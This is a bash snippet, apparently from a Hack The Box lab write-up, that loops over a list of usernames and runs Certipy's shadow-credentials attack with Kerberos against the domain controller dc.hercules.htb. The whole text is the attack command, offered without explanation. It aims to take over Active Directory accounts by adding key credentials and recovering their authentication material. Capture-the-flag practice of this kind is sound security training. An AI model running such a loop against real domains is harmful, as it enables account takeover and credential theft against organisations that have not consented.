```bash
for user in $(cat users.txt); do
    echo "Testing $user..."
    certipy shadow auto -k -no-pass -dc-ip 10.10.11.91 -target dc.hercules.htb -account $user 2>/dev/null
done
```
